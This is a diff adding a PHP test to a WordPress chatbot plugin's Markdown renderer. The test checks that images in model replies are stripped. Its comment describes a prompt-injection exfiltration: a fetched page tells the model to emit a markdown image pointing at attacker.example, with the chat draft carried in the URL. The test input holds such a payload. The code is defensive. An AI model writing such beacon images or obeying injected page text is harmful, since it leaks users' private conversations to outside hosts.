@@ -37,3 +37,16 @@ it('strips raw HTML, block and inline, and unsafe links before wp_kses ever sees
     // The stripped block leaves its trailing newline behind, hence the leading "\n".
     expect($html)->toBe("\n<p>see alert(2) here</p>\n<p><a>x</a></p>\n");
 });
+
+it('loads no image a reply names, so a prompt-injected reply cannot beacon the chat to another host', function (): void {
+    // An image in model output is fetched by the viewer's browser the moment the reply renders,
+    // with no click: `![](https://attacker.example/c?d=<the draft, URL-encoded>)` written by a
+    // model a fetched page told to write it is the whole exfiltration. The allowlist keeps no
+    // img; a site that wants images back adds it through alpaca_bot/render/allowed_tags.
+    Functions\when('wp_kses')->alias(fn(string $html, array $allowed) => strip_tags($html, array_map(fn($t) => "<$t>", array_keys($allowed))));
+    Filters\expectApplied('alpaca_bot/render/allowed_tags')->once()->andReturnFirstArg();
+
+    $html = (new Markdown())->toHtml('Done. ![](https://attacker.example/c?d=secret-draft)');
+
+    expect($html)->not->toContain('<img')->not->toContain('attacker.example');
+});
